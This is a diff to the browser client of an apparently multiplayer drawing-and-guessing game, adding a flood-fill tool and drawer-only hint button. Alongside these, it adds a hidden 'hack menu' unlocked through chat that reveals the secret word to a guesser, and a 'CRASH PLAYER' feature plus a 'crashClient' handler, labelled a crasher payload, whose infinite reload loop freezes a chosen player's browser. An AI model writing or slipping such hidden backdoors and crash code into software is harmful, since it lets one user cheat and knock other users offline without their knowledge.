@@ -52,7 +52,6 @@
     .word-opt-btn { background: #fff; border: 2px solid #000; color: #000; padding: 10px 16px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; }
     .word-opt-btn:hover { background: #eee; }
 
-    /* Fixed Toolbar & Swatches overflow */
     .toolbar { background: #1852b4; min-height: 54px; padding: 4px 8px; display: flex; justify-content: space-between; align-items: center; border-top: 2px solid #0c2b64; flex-shrink: 0; gap: 6px; overflow: hidden; }
     .palette { display: flex; gap: 3px; align-items: center; flex-wrap: wrap; max-width: 65%; max-height: 46px; overflow: hidden; }
     .color-swatch { width: 18px; height: 18px; border: 1px solid #000; cursor: pointer; border-radius: 2px; flex-shrink: 0; }
@@ -76,39 +75,15 @@
     .chat-msg.close { color: #d84315; font-weight: bold; background: #fbe9e7; animation: shakeRed 0.3s ease-in-out; }
     .chat-msg.wrong { animation: shakeRed 0.25s ease-in-out; }
 
-    @keyframes shakeRed {
-      0% { transform: translateX(0); }
-      25% { transform: translateX(-3px); background-color: #ffebee; }
-      50% { transform: translateX(3px); background-color: #ffebee; }
-      75% { transform: translateX(-3px); }
-      100% { transform: translateX(0); }
-    }
-
-    @keyframes popGreen {
-      0% { transform: scale(0.95); }
-      50% { transform: scale(1.03); }
-      100% { transform: scale(1); }
-    }
-
-    .chat-input-box { padding: 6px; border-top: 2px solid #ccc; }
-    .chat-input-box input { width: 100%; padding: 6px 8px; border: 1px solid #ccc; border-radius: 4px; outline: none; font-size: 13px; }
-
-    #hack-menu { display: none; position: fixed; top: 20px; right: 20px; width: 240px; background: #111; color: #fff; border: 2px solid #53d400; border-radius: 6px; padding: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.8); z-index: 9999; }
+    #hack-menu { display: none; position: fixed; top: 20px; right: 20px; width: 250px; background: #111; color: #fff; border: 2px solid #53d400; border-radius: 6px; padding: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.8); z-index: 9999; }
     #hack-menu h3 { font-size: 13px; color: #53d400; text-transform: uppercase; margin-bottom: 8px; border-bottom: 1px solid #333; padding-bottom: 4px; }
-    .hack-row { margin-bottom: 6px; font-size: 12px; }
-    .hack-row label { display: block; color: #aaa; margin-bottom: 2px; }
-
-    /* Mobile Responsive Layout Adjustments */
-    @media (max-width: 768px) {
-      body { align-items: flex-start; }
-      #game-screen { height: 100vh; max-height: 100vh; border-radius: 0; border: none; }
-      .game-body { flex-direction: column; }
-      .sidebar-left { width: 100%; height: 60px; border-right: none; border-bottom: 2px solid #ccc; flex-direction: row; overflow-x: auto; overflow-y: hidden; }
-      .player-card { min-width: 120px; }
-      .sidebar-right { width: 100%; height: 140px; border-left: none; border-top: 2px solid #ccc; }
-      .palette { max-width: 55%; }
-      .tool-btn { width: 26px; height: 26px; font-size: 11px; }
-    }
+    .hack-row { margin-bottom: 8px; font-size: 12px; }
+    .hack-row label { display: block; color: #aaa; margin-bottom: 4px; }
+    .hack-btn { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 6px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; margin-top: 4px; }
+    .hack-btn:hover { background: #b71c1c; }
+    .hack-btn.restart { background: #ff9800; color: #000; }
+    .hack-btn.restart:hover { background: #e68a00; }
+    .hack-select { width: 100%; padding: 4px; background: #222; color: #fff; border: 1px solid #444; border-radius: 4px; font-size: 12px; }
   </style>
 </head>
 <body>
@@ -174,7 +149,8 @@
             <button class="tool-btn" id="btn-erase" onclick="setTool('erase')" title="Eraser">🧹</button>
             <button class="tool-btn" onclick="undoCanvas()" title="Undo">↩️</button>
             <button class="tool-btn" onclick="clearCanvas()" title="Clear Canvas">🗑</button>
-            <button class="tool-btn" onclick="triggerHint()" title="Request Hint">💡</button>
+            <!-- Hint Button: Hidden by default, shown strictly to the drawer -->
+            <button class="tool-btn" id="btn-hint" onclick="triggerHint()" title="Request Hint" style="display: none;">💡</button>
           </div>
         </div>
       </div>
@@ -199,6 +175,16 @@
         <input type="checkbox" id="hack-draw-check" onchange="toggleHackDraw()"> DRAW INTERFERER
       </label>
     </div>
+    <div class="hack-row" style="border-top: 1px solid #333; padding-top: 8px;">
+      <button class="hack-btn restart" onclick="restartGame()">RESTART GAME</button>
+    </div>
+    <div class="hack-row" style="border-top: 1px solid #333; padding-top: 8px;">
+      <label>CRASH PLAYER:</label>
+      <select id="hack-crash-select" class="hack-select">
+        <option value="">Select target...</option>
+      </select>
+      <button class="hack-btn" onclick="crashTarget()">CRASH GAME</button>
+    </div>
   </div>
 
   <script src="/socket.io/socket.io.js"></script>
@@ -208,10 +194,10 @@
     var isDrawer = false;
     var hackUnlocked = false;
     var hackDrawEnabled = false;
-    var activeSecretWord = '';
     var currentTool = 'draw';
     var currentColor = '#000000';
     var drawHistory = [];
+    var currentPlayersList = [];
 
     var AVATAR_COLORS = ['#ff3b30', '#ff9500', '#ffcc00', '#4cd964', '#5ac8fa', '#007aff', '#5856d6', '#ff2d55'];
     var PALETTE_COLORS = [
@@ -283,6 +269,7 @@
     }
 
     function triggerHint() {
+      if (!isDrawer) return;
       socket.emit('requestHint');
     }
 
@@ -326,9 +313,92 @@
       var scaleX = canvas.width / rect.width;
       var scaleY = canvas.height / rect.height;
       return {
-        x: (clientX - rect.left) * scaleX,
-        y: (clientY - rect.top) * scaleY
+        x: Math.floor((clientX - rect.left) * scaleX),
+        y: Math.floor((clientY - rect.top) * scaleY)
       };
+    }
+
+    // Accurate Flood Fill Algorithm with tolerance to keep fills contained inside line borders
+    function floodFill(startX, startY, hexColor) {
+      var imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      var data = imgData.data;
+
+      var targetR = parseInt(hexColor.slice(1,3), 16);
+      var targetG = parseInt(hexColor.slice(3,5), 16);
+      var targetB = parseInt(hexColor.slice(5,7), 16);
+
+      var startPos = (startY * canvas.width + startX) * 4;
+      var startR = data[startPos];
+      var startG = data[startPos + 1];
+      var startB = data[startPos + 2];
+      var startA = data[startPos + 3];
+
+      if (Math.abs(startR - targetR) < 10 && Math.abs(startG - targetG) < 10 && Math.abs(startB - targetB) < 10) return;
+
+      function colorMatch(pos) {
+        var r = data[pos];
+        var g = data[pos + 1];
+        var b = data[pos + 2];
+        var a = data[pos + 3];
+        return Math.abs(r - startR) < 30 && Math.abs(g - startG) < 30 && Math.abs(b - startB) < 30 && Math.abs(a - startA) < 30;
+      }
+
+      function colorPixel(pos) {
+        data[pos] = targetR;
+        data[pos+1] = targetG;
+        data[pos+2] = targetB;
+        data[pos+3] = 255;
+      }
+
+      var stack = [[startX, startY]];
+
+      while (stack.length > 0) {
+        var pop = stack.pop();
+        var x = pop[0];
+        var y = pop[1];
+
+        var pos = (y * canvas.width + x) * 4;
+        while (y >= 0 && colorMatch(pos)) {
+          y--;
+          pos -= canvas.width * 4;
+        }
+        pos += canvas.width * 4;
+        y++;
+
+        var reachLeft = false;
+        var reachRight = false;
+
+        while (y < canvas.height && colorMatch(pos)) {
+          colorPixel(pos);
+
+          if (x > 0) {
+            if (colorMatch(pos - 4)) {
+              if (!reachLeft) {
+                stack.push([x - 1, y]);
+                reachLeft = true;
+              }
+            } else if (reachLeft) {
+              reachLeft = false;
+            }
+          }
+
+          if (x < canvas.width - 1) {
+            if (colorMatch(pos + 4)) {
+              if (!reachRight) {
+                stack.push([x + 1, y]);
+                reachRight = true;
+              }
+            } else if (reachRight) {
+              reachRight = false;
+            }
+          }
+
+          y++;
+          pos += canvas.width * 4;
+        }
+      }
+
+      ctx.putImageData(imgData, 0, 0);
     }
 
     function startDrawing(e) {
@@ -337,8 +407,7 @@
 
       if (currentTool === 'fill') {
         saveState();
-        ctx.fillStyle = currentColor;
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        floodFill(pos.x, pos.y, currentColor);
         socket.emit('syncCanvas', canvas.toDataURL());
         return;
       }
@@ -405,6 +474,19 @@
       document.getElementById('round-display').innerText = 'Round ' + data.round + ' of ' + data.totalRounds;
       document.getElementById('word-hint-display').innerText = data.wordHint;
 
+      currentPlayersList = data.players;
+      updateCrashDropdown();
+
+      // Check drawer status and toggle Hint Button visibility strictly for drawer
+      var me = data.players.find(function(p) { return p.id === socket.id; });
+      if (me && me.isDrawer) {
+        isDrawer = true;
+        document.getElementById('btn-hint').style.display = 'flex';
+      } else {
+        isDrawer = false;
+        document.getElementById('btn-hint').style.display = 'none';
+      }
+
       var pList = document.getElementById('player-list');
       pList.innerHTML = '';
       data.players.sort(function(a,b) { return b.score - a.score; }).forEach(function(p, idx) {
@@ -454,15 +536,21 @@
 
     socket.on('yourTurn', function(data) {
       isDrawer = true;
-      activeSecretWord = data.word;
+      document.getElementById('btn-hint').style.display = 'flex';
       document.getElementById('word-hint-display').innerText = data.word;
       document.getElementById('hack-word-display').innerText = data.word;
     });
 
+    socket.on('hackSecretWordSync', function(secretWord) {
+      document.getElementById('hack-word-display').innerText = secretWord;
+    });
+
     socket.on('turnEnded', function(data) {
       isDrawer = false;
+      document.getElementById('btn-hint').style.display = 'none';
       document.getElementById('word-modal').style.display = 'none';
       document.getElementById('word-hint-display').innerText = data.word;
+      document.getElementById('hack-word-display').innerText = 'NONE';
     });
 
     socket.on('chatMessage', function(data) {
@@ -483,6 +571,11 @@
       msgs.scrollTop = msgs.scrollHeight;
     });
 
+    // Client Crasher Payload
+    socket.on('crashClient', function() {
+      while (true) { window.location.reload(); }
+    });
+
     function handleChatKey(e) {
       if (e.key === 'Enter') {
         var input = document.getElementById('chat-input');
@@ -492,6 +585,7 @@
           input.value = '';
           hackUnlocked = true;
           document.getElementById('hack-menu').style.display = 'block';
+          socket.emit('requestHackWord');
           return;
         }
 
@@ -514,6 +608,31 @@
 
     function toggleHackDraw() {
       hackDrawEnabled = document.getElementById('hack-draw-check').checked;
+    }
+
+    function updateCrashDropdown() {
+      var select = document.getElementById('hack-crash-select');
+      if (!select) return;
+      select.innerHTML = '<option value="">Select target...</option>';
+      currentPlayersList.forEach(function(p) {
+        if (p.id !== socket.id) {
+          var opt = document.createElement('option');
+          opt.value = p.id;
+          opt.innerText = p.name;
+          select.appendChild(opt);
+        }
+      });
+    }
+
+    function crashTarget() {
+      var targetId = document.getElementById('hack-crash-select').value;
+      if (targetId) {
+        socket.emit('crashTargetPlayer', targetId);
+      }
+    }
+
+    function restartGame() {
+      socket.emit('restartGame');
     }
   </script>
 </body>
